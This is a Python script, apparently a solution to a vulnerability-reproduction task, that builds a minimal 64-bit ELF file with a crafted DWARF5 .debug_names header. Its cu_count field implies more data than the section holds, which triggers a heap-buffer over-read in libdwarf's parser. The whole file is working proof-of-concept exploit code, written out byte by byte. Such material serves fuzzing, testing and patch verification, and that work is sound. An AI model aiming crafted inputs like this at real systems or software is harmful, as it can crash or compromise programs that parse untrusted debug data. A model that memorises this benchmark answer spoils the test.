import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap-buffer-over-read in the DWARF5 .debug_names
        section parser in libdwarf. A missing bounds check allows a crafted
        header to cause a read beyond the end of the heap-allocated buffer for
        the section's data.

        This PoC constructs a minimal 64-bit ELF file with a malicious
        .debug_names section. The header of this section specifies a count
        of compilation units (cu_count) that implies a data size larger than
        the actual section. The vulnerable code attempts to read this data,
        over-reading the heap buffer. The PoC ensures the read stays within the
        overall file bounds to bypass other checks, specifically targeting the
        vulnerable calculation logic.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input (a crafted ELF file) that triggers the vulnerability.
        """
        p64 = lambda x: struct.pack('<Q', x)
        p32 = lambda x: struct.pack('<L', x)
        p16 = lambda x: struct.pack('<H', x)

        # --- Section Data Payloads ---

        # .shstrtab: Contains section names for the ELF file.
        shstrtab_data = b'\0.debug_names\0.shstrtab\0'
        shstrtab_size = len(shstrtab_data)
        
        # .debug_names: The malicious section.
        # The DWARF5 header fields occupy 36 bytes. We make the section this exact size.
        debug_names_size = 36
        # unit_length is the size of the compilation unit data following the length field itself.
        # For a 32-bit DWARF format, section_size = unit_length + 4.
        unit_length = debug_names_size - 4
        
        # Setting cu_count=1 causes the parser to attempt to read an 8-byte index.
        # Since the header consumes the entire section, this read is entirely
        # out-of-bounds relative to the section's buffer. The patched code would
        # detect this (needed size 44 > section size 36) and abort.
        cu_count = 1
        
        debug_names_data = b''
        debug_names_data += p32(unit_length)    # unit_length
        debug_names_data += p16(5)              # version (DWARF5)
        debug_names_data += p16(0)              # padding
        debug_names_data += p32(cu_count)       # cu_count
        debug_names_data += p32(0) * 6          # Other counts and sizes (all zero)

        # --- ELF File Layout Calculation ---
        elf_header_size = 64
        sht_entry_size = 64
        num_sections = 3  # NULL, .debug_names, .shstrtab
        sht_size = num_sections * sht_entry_size
        
        headers_size = elf_header_size + sht_size
        
        debug_names_offset = headers_size
        shstrtab_offset = debug_names_offset + debug_names_size
        
        # --- ELF Header (64-bit) ---
        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        elf_header = b''
        elf_header += e_ident
        elf_header += p16(1)  # e_type = ET_REL
        elf_header += p16(62) # e_machine = EM_X86_64
        elf_header += p32(1)  # e_version
        elf_header += p64(0)  # e_entry
        elf_header += p64(0)  # e_phoff
        elf_header += p64(elf_header_size) # e_shoff (offset to Section Header Table)
        elf_header += p32(0)  # e_flags
        elf_header += p16(elf_header_size) # e_ehsize
        elf_header += p16(0)  # e_phentsize
        elf_header += p16(0)  # e_phnum
        elf_header += p16(sht_entry_size) # e_shentsize
        elf_header += p16(num_sections) # e_shnum
        elf_header += p16(2)  # e_shstrndx (index of .shstrtab)

        # --- Section Header Table (SHT) ---
        sht = b''
        
        # Entry 0: NULL Section (required)
        sht += b'\x00' * sht_entry_size
        
        # Entry 1: .debug_names Section
        sh_name_dn = shstrtab_data.find(b'.debug_names')
        sht += p32(sh_name_dn)
        sht += p32(1)  # sh_type = SHT_PROGBITS
        sht += p64(0)  # sh_flags
        sht += p64(0)  # sh_addr
        sht += p64(debug_names_offset)
        sht += p64(debug_names_size)
        sht += p32(0)  # sh_link
        sht += p32(0)  # sh_info
        sht += p64(1)  # sh_addralign
        sht += p64(0)  # sh_entsize
        
        # Entry 2: .shstrtab Section
        sh_name_shs = shstrtab_data.find(b'.shstrtab')
        sht += p32(sh_name_shs)
        sht += p32(3)  # sh_type = SHT_STRTAB
        sht += p64(0)  # sh_flags
        sht += p64(0)  # sh_addr
        sht += p64(shstrtab_offset)
        sht += p64(shstrtab_size)
        sht += p32(0)  # sh_link
        sht += p32(0)  # sh_info
        sht += p64(1)  # sh_addralign
        sht += p64(0)  # sh_entsize

        # --- Assemble Final PoC File ---
        poc = elf_header + sht + debug_names_data + shstrtab_data
        
        return poc
